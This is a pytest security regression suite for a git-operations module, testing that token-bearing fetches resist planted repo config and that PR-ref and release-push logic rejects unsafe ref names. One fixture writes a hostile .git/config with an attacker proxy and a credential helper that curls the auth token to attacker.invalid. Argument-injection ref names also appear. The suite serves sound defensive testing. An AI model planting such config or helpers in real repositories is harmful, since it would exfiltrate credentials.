"""Security regression tests for `robomp.git_ops` PAT-bearing hardening."""

from __future__ import annotations

import os
import subprocess
from pathlib import Path
from unittest.mock import Mock

import pytest

from robomp import git_ops
from robomp.git_ops import _TOKEN_SAFE_CONFIG, GitCommandError, _token_url_safe_config, push_release

_AUTH_URL = "https://github.com/octo/widget.git"


def _token_config_args(auth_url: str) -> list[str]:
    """The exact `-c` set `_run_git` applies to a token-bearing invocation."""
    args: list[str] = []
    for item in (*_TOKEN_SAFE_CONFIG, *_token_url_safe_config(auth_url)):
        args += ["-c", item]
    return args


def _effective(repo_dir: Path, key: str, request_url: str) -> str:
    # Mirror `_run_git`: ignore system/global config so only the
    # (agent-writable) repo-local `.git/config` competes with our `-c` set.
    env = {
        **os.environ,
        "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_CONFIG_SYSTEM": "/dev/null",
        "GIT_CONFIG_GLOBAL": "/dev/null",
    }
    proc = subprocess.run(
        ["git", "-C", str(repo_dir), *_token_config_args(_AUTH_URL), "config", "--get-urlmatch", key, request_url],
        capture_output=True,
        text=True,
        check=False,
        env=env,
    )
    return proc.stdout.strip()


def test_token_hardening_neutralizes_path_specific_http_mitm(tmp_path: Path) -> None:
    """A request-path-specific repo-local `http.<url>/info/refs.*` MUST NOT
    out-specify our override set.

    git matches `http.<url>.*` / `credential.<url>.*` against the full request
    URL and the longest path-prefix wins, so an agent with group write to the
    shared pool config could plant `http.<auth_url>/info/refs.proxy=http://evil`
    + `credential.<…>.helper=!cmd` to route the token-bearing fetch through an
    attacker proxy (or run a helper) and read the injected Authorization header.
    The per-request-path override set must drive `proxy` (empty), `sslVerify`
    (true), and `credential.helper` (empty) back to safe values for every git
    smart-HTTP endpoint. CA paths are intentionally left at the system default
    (see `_token_url_safe_config`); with the proxy neutralized an attacker CA is
    DoS-only, and blanking it would break real TLS.
    """
    repo = tmp_path / "pool"
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    cfg = repo / ".git" / "config"
    cfg.write_text(
        cfg.read_text(encoding="utf-8")
        + (
            f'[http "{_AUTH_URL}/info/refs"]\n'
            "\tproxy = http://attacker.invalid:8080\n"
            "\tsslVerify = false\n"
            "\tsslCAInfo = /tmp/attacker.pem\n"
            "\tsslCAPath = /tmp/attacker-castore\n"
            f'[http "{_AUTH_URL}/git-upload-pack"]\n'
            "\tproxy = http://attacker.invalid:8080\n"
            f'[http "{_AUTH_URL}/git-receive-pack"]\n'
            "\tproxy = http://attacker.invalid:8080\n"
            f'[credential "{_AUTH_URL}/info/refs"]\n'
            "\thelper = !sh -c 'curl attacker.invalid?$ROBOMP_GIT_HTTP_AUTH'\n"
        ),
        encoding="utf-8",
    )
    for request_url in (
        _AUTH_URL,
        f"{_AUTH_URL}/info",
        f"{_AUTH_URL}/info/refs",
        f"{_AUTH_URL}/git-upload-pack",
        f"{_AUTH_URL}/git-receive-pack",
    ):
        assert _effective(repo, "http.proxy", request_url) == "", request_url
        assert _effective(repo, "http.sslVerify", request_url) == "true", request_url
        assert _effective(repo, "credential.helper", request_url) == "", request_url


def test_token_url_safe_config_is_empty_without_auth_url() -> None:
    assert _token_url_safe_config(None) == []


def test_token_url_safe_config_covers_smart_http_paths() -> None:
    items = set(_token_url_safe_config(_AUTH_URL))
    # Every reachable git smart-HTTP request path must blank proxy + credential
    # helper and force sslVerify=true — `--get-urlmatch` returns "" for an
    # *absent* key too, so the effective-value test alone can't prove the set
    # is complete; assert membership explicitly.
    for suffix in ("", "/info", "/info/refs", "/git-upload-pack", "/git-receive-pack"):
        scoped = f"{_AUTH_URL}{suffix}"
        assert f"http.{scoped}.proxy=" in items, scoped
        assert f"http.{scoped}.sslVerify=true" in items, scoped
        assert f"credential.{scoped}.helper=" in items, scoped
    # The base header is blanked (the real one is injected via --config-env),
    # but path-scoped extraHeader blanks MUST NOT exist or they'd strip auth.
    assert f"http.{_AUTH_URL}.extraHeader=" in items
    assert f"http.{_AUTH_URL}/info/refs.extraHeader=" not in items


def test_token_config_never_blanks_ca_locations() -> None:
    """Regression guard: an empty `http.sslCAInfo=`/`sslCAPath=` makes libcurl
    fail with "error setting certificate verify locations" before any TLS,
    breaking every real github fetch. Neither the base nor the per-URL set may
    reintroduce them (proxy-neutralization + forced sslVerify already close the
    exfil path without touching the CA bundle)."""
    blob = " ".join((*_TOKEN_SAFE_CONFIG, *_token_url_safe_config(_AUTH_URL))).lower()
    assert "sslcainfo=" not in blob
    assert "sslcapath=" not in blob


def _git(repo: Path, *args: str, check: bool = True) -> str:
    proc = subprocess.run(
        ["git", *args],
        cwd=repo,
        check=check,
        capture_output=True,
        text=True,
        env=os.environ
        | {
            "GIT_AUTHOR_NAME": "release-test",
            "GIT_AUTHOR_EMAIL": "release-test@example.invalid",
            "GIT_COMMITTER_NAME": "release-test",
            "GIT_COMMITTER_EMAIL": "release-test@example.invalid",
        },
    )
    return proc.stdout.strip()


def _release_repos(tmp_path: Path) -> tuple[Path, Path, str]:
    origin = tmp_path / "origin.git"
    work = tmp_path / "work"
    _git(tmp_path, "init", "--bare", "--initial-branch=main", str(origin))
    _git(tmp_path, "init", "--initial-branch=main", str(work))
    (work / "README.md").write_text("release\n", encoding="utf-8")
    _git(work, "add", "README.md")
    _git(work, "commit", "-m", "initial")
    _git(work, "remote", "add", "origin", str(origin))
    _git(work, "push", "--set-upstream", "origin", "main")
    return origin, work, _git(work, "rev-parse", "HEAD")


def _commit(work: Path, name: str, content: str) -> str:
    (work / name).write_text(content, encoding="utf-8")
    _git(work, "add", name)
    _git(work, "commit", "-m", f"chore: bump version to {content.strip()}")
    return _git(work, "rev-parse", "HEAD")


def test_push_release_lands_branch_and_tag_atomically(tmp_path: Path) -> None:
    origin, work, _ = _release_repos(tmp_path)
    head = _commit(work, "fix.txt", "1.2.3\n")
    result = push_release(work, branch="main", tag="v1.2.3", expected_head=head, token=None)
    assert result.head == head
    assert _git(tmp_path, "--git-dir", str(origin), "rev-parse", "refs/heads/main") == head
    assert _git(tmp_path, "--git-dir", str(origin), "rev-parse", "refs/tags/v1.2.3") == head


def test_push_release_forces_existing_tag_to_new_head(tmp_path: Path) -> None:
    origin, work, old_head = _release_repos(tmp_path)
    _git(work, "push", "origin", f"{old_head}:refs/tags/v1.2.3")
    head = _commit(work, "fix.txt", "1.2.3\n")
    push_release(work, branch="main", tag="v1.2.3", expected_head=head, token=None)
    assert _git(tmp_path, "--git-dir", str(origin), "rev-parse", "refs/tags/v1.2.3") == head


def test_push_release_rejects_non_fast_forward_without_moving_tag(tmp_path: Path) -> None:
    origin, work, old_head = _release_repos(tmp_path)
    _git(work, "push", "origin", f"{old_head}:refs/tags/v1.2.3")
    local_head = _commit(work, "local.txt", "1.2.3\n")

    other = tmp_path / "other"
    _git(tmp_path, "clone", str(origin), str(other))
    remote_head = _commit(other, "remote.txt", "1.2.4\n")
    _git(other, "push", "origin", "main")

    with pytest.raises(GitCommandError):
        push_release(work, branch="main", tag="v1.2.3", expected_head=local_head, token=None)
    assert _git(tmp_path, "--git-dir", str(origin), "rev-parse", "refs/heads/main") == remote_head
    assert _git(tmp_path, "--git-dir", str(origin), "rev-parse", "refs/tags/v1.2.3") == old_head


def test_fetch_pr_head_recovers_missing_pull_ref_in_real_repo(tmp_path: Path) -> None:
    _, work, head = _release_repos(tmp_path)
    # The upstream advertises only main, not refs/pull/7/head.
    git_ops.fetch_pr_head(work, 7, token=None, head_ref="main", head_sha=head, same_repo=True)
    assert _git(work, "rev-parse", "FETCH_HEAD") == head


@pytest.fixture
def pr_fetch(monkeypatch: pytest.MonkeyPatch) -> tuple[Mock, Mock]:
    run = Mock(return_value=subprocess.CompletedProcess([], 0, "abc123\n", ""))
    backfill = Mock(return_value=None)
    monkeypatch.setattr(git_ops, "_run_git", run)
    monkeypatch.setattr(git_ops, "_backfill_tip_blobs", backfill)
    return run, backfill


@pytest.mark.parametrize("head_ref", ["feature/x", "feature+probe", "a@b", "funk-branch-é"])
@pytest.mark.parametrize("same_repo", [False, True])
def test_fetch_pr_head_prefers_pull_ref(
    tmp_path: Path, pr_fetch: tuple[Mock, Mock], head_ref: str, same_repo: bool
) -> None:
    run, backfill = pr_fetch
    git_ops.fetch_pr_head(tmp_path, 7, token=None, head_ref=head_ref, head_sha="abc123", same_repo=same_repo)
    assert [call.args[0] for call in run.call_args_list] == [["fetch", "--no-tags", "origin", "pull/7/head"]]
    backfill.assert_called_once()


@pytest.mark.parametrize("head_ref", ["feature/x", "feature+probe", "a@b", "funk-branch-é"])
def test_fetch_pr_head_falls_back_to_same_repo_branch(
    tmp_path: Path, pr_fetch: tuple[Mock, Mock], head_ref: str
) -> None:
    run, backfill = pr_fetch
    run.side_effect = [
        subprocess.CompletedProcess([], 128, "", "fatal: couldn't find remote ref pull/7/head"),
        subprocess.CompletedProcess([], 0, "", ""),
        subprocess.CompletedProcess([], 0, "abc123\n", ""),
    ]
    git_ops.fetch_pr_head(tmp_path, 7, token=None, head_ref=head_ref, head_sha="abc123", same_repo=True)
    assert [call.args[0] for call in run.call_args_list] == [
        ["fetch", "--no-tags", "origin", "pull/7/head"],
        ["fetch", "--no-tags", "origin", "--", f"refs/heads/{head_ref}"],
        ["rev-parse", "FETCH_HEAD"],
    ]
    backfill.assert_called_once()
    assert backfill.call_args.args[1] == "FETCH_HEAD"


def test_fetch_pr_head_rejects_stale_branch_sha(tmp_path: Path, pr_fetch: tuple[Mock, Mock]) -> None:
    run, backfill = pr_fetch
    run.side_effect = [
        subprocess.CompletedProcess([], 128, "", "couldn't find remote ref pull/7/head"),
        subprocess.CompletedProcess([], 0, "", ""),
        subprocess.CompletedProcess([], 0, "new-sha\n", ""),
    ]
    with pytest.raises(GitCommandError, match="PR head SHA mismatch"):
        git_ops.fetch_pr_head(tmp_path, 7, token=None, head_ref="feature/x", head_sha="old-sha", same_repo=True)
    backfill.assert_not_called()


@pytest.mark.parametrize(
    ("same_repo", "head_ref", "stderr"),
    [(False, "feature/x", "couldn't find remote ref"), (True, None, "couldn't find remote ref"),
     (True, "feature/x", "authentication failed")],
)
def test_fetch_pr_head_preserves_ineligible_error(
    tmp_path: Path, pr_fetch: tuple[Mock, Mock], same_repo: bool, head_ref: str | None, stderr: str
) -> None:
    run, backfill = pr_fetch
    original = GitCommandError(["git", "fetch"], 128, "", stderr)
    run.side_effect = original
    with pytest.raises(GitCommandError) as caught:
        git_ops.fetch_pr_head(tmp_path, 7, token=None, head_ref=head_ref, same_repo=same_repo)
    assert caught.value is original
    run.assert_called_once()
    backfill.assert_not_called()


def test_fetch_pr_head_combines_fetch_failures(tmp_path: Path, pr_fetch: tuple[Mock, Mock]) -> None:
    run, backfill = pr_fetch
    run.side_effect = [
        subprocess.CompletedProcess([], 128, "", "couldn't find remote ref pull/7/head"),
        subprocess.CompletedProcess([], 128, "", "branch fetch failed"),
    ]
    with pytest.raises(GitCommandError) as caught:
        git_ops.fetch_pr_head(
            tmp_path, 7, token=None, head_ref="feature/x", head_sha="abc123", same_repo=True
        )
    assert "couldn't find remote ref" in caught.value.stderr
    assert "branch fetch failed" in caught.value.stderr
    backfill.assert_not_called()


@pytest.mark.parametrize(
    "head_ref",
    [
        "--dry-run", "main:refs/heads/evil", "a..b", "a//b", "a b",
        "a~b", "a^b", "a?b", "a*b", "a[b", "a\\b", "a\x00b", "a\x1fb", "a\x7fb",
        "a@{b", "@", "/main", "main/", "main.", "main.lock", ".hidden/main", "a.lock/main",
        "refs/heads/-evil",
    ],
)
def test_fetch_pr_head_rejects_unsafe_ref_before_branch_fetch(
    tmp_path: Path, pr_fetch: tuple[Mock, Mock], head_ref: str
) -> None:
    # Validation is deferred to the fallback path: the primary PR-ref fetch
    # runs, fails with a missing remote ref, and the unsafe branch name is
    # rejected before any branch fetch is attempted.
    run, backfill = pr_fetch
    run.side_effect = [
        subprocess.CompletedProcess([], 128, "", "fatal: couldn't find remote ref pull/7/head")
    ]
    with pytest.raises(ValueError, match="invalid ref"):
        git_ops.fetch_pr_head(
            tmp_path, 7, token=None, head_ref=head_ref, head_sha="abc123", same_repo=True
        )
    assert [call.args[0] for call in run.call_args_list] == [
        ["fetch", "--no-tags", "origin", "pull/7/head"]
    ]
    backfill.assert_not_called()


def test_fetch_pr_head_fallback_requires_head_sha(tmp_path: Path, pr_fetch: tuple[Mock, Mock]) -> None:
    # Without a head SHA the fetched branch tip cannot be verified, so the
    # fallback is ineligible and the original error propagates.
    run, backfill = pr_fetch
    original = GitCommandError(
        ["git", "fetch"], 128, "", "fatal: couldn't find remote ref pull/7/head"
    )
    run.side_effect = original
    with pytest.raises(GitCommandError) as caught:
        git_ops.fetch_pr_head(tmp_path, 7, token=None, head_ref="feature/x", same_repo=True)
    assert caught.value is original
    run.assert_called_once()
    backfill.assert_not_called()
